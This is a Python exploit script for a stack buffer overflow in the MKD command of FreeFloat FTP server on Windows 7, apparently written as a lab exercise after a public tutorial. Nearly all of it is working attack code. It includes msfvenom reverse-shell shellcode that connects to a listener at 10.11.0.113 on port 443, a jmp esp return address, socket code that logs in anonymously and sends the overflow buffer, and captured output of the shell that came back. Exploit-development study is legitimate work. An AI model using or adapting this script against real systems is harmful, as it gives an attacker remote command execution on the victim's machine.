#!/usr/bin/python

#----------------------------------------------------------------------------------#
# Exploit: FreeFloat FTP (MKD BOF)                                                 #
# OS: Windows 7 Professional N                                                     #
# Author: JMcPeters based on exploit from b33f (Ruben Boonen)                      #
# Software: http://www.freefloat.com/software/freefloatftpserver.zip               #
#----------------------------------------------------------------------------------#
# http://www.fuzzysecurity.com/tutorials/expDev/2.html                             #
# https://www.leapsecurity.io/blog/buffer-overflow-smashing-the-stack-tutorial/    #
#----------------------------------------------------------------------------------#
# listening on [any] 443 ...
# 10.11.13.39: inverse host lookup failed: Unknown host
# connect to [10.11.0.113] from (UNKNOWN) [10.11.13.39] 49202
# Microsoft Windows [Version 6.1.7601]
# Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
#
# C:\687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver\Win32>
#
#----------------------------------------------------------------------------------#
 
import socket
import sys
 
#----------------------------------------------------------------------------------#
#
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.113 LPORT=443 -b '\x00\x0a\x0d' -f c
#
#----------------------------------------------------------------------------------#
 
shellcode = (
"\xbf\x52\x1e\xc9\xaf\xda\xd8\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x7e\x12\x03\x7e\x12\x83\x94\x1a\x2b\x5a\xe4\xcb\x29"
"\xa5\x14\x0c\x4e\x2f\xf1\x3d\x4e\x4b\x72\x6d\x7e\x1f\xd6\x82"
"\xf5\x4d\xc2\x11\x7b\x5a\xe5\x92\x36\xbc\xc8\x23\x6a\xfc\x4b"
"\xa0\x71\xd1\xab\x99\xb9\x24\xaa\xde\xa4\xc5\xfe\xb7\xa3\x78"
"\xee\xbc\xfe\x40\x85\x8f\xef\xc0\x7a\x47\x11\xe0\x2d\xd3\x48"
"\x22\xcc\x30\xe1\x6b\xd6\x55\xcc\x22\x6d\xad\xba\xb4\xa7\xff"
"\x43\x1a\x86\xcf\xb1\x62\xcf\xe8\x29\x11\x39\x0b\xd7\x22\xfe"
"\x71\x03\xa6\xe4\xd2\xc0\x10\xc0\xe3\x05\xc6\x83\xe8\xe2\x8c"
"\xcb\xec\xf5\x41\x60\x08\x7d\x64\xa6\x98\xc5\x43\x62\xc0\x9e"
"\xea\x33\xac\x71\x12\x23\x0f\x2d\xb6\x28\xa2\x3a\xcb\x73\xab"
"\x8f\xe6\x8b\x2b\x98\x71\xf8\x19\x07\x2a\x96\x11\xc0\xf4\x61"
"\x55\xfb\x41\xfd\xa8\x04\xb2\xd4\x6e\x50\xe2\x4e\x46\xd9\x69"
"\x8e\x67\x0c\x3d\xde\xc7\xff\xfe\x8e\xa7\xaf\x96\xc4\x27\x8f"
"\x87\xe7\xed\xb8\x22\x12\x66\xcd\xb9\x1c\x07\xb9\xbf\x1c\xe6"
"\x82\x49\xfa\x82\xe4\x1f\x55\x3b\x9c\x05\x2d\xda\x61\x90\x48"
"\xdc\xea\x17\xad\x93\x1a\x5d\xbd\x44\xeb\x28\x9f\xc3\xf4\x86"
"\xb7\x88\x67\x4d\x47\xc6\x9b\xda\x10\x8f\x6a\x13\xf4\x3d\xd4"
"\x8d\xea\xbf\x80\xf6\xae\x1b\x71\xf8\x2f\xe9\xcd\xde\x3f\x37"
"\xcd\x5a\x6b\xe7\x98\x34\xc5\x41\x73\xf7\xbf\x1b\x28\x51\x57"
"\xdd\x02\x62\x21\xe2\x4e\x14\xcd\x53\x27\x61\xf2\x5c\xaf\x65"
"\x8b\x80\x4f\x89\x46\x01\x7f\xc0\xca\x20\xe8\x8d\x9f\x70\x75"
"\x2e\x4a\xb6\x80\xad\x7e\x47\x77\xad\x0b\x42\x33\x69\xe0\x3e"
"\x2c\x1c\x06\xec\x4d\x35")
 
#----------------------------------------------------------------------------------#
# Badchars: \x00\x0A\x0D                                                           #
#----------------------------------------------------------------------------------#
 
buffer = "\x90"*20 + shellcode
# jmp esp user32.dll 762B6D53
#
# evil = "A"*247 + "\x53\x6D\x2B\x76" + buffer + "C"*(749-len(buffer))
#
# jmp esp ntdll.dll 77BBE871
evil = "A"*247 + "\x71\xE8\xBB\x77" + buffer + "C"*(749-len(buffer)) 

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('10.11.13.39',21))
 
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
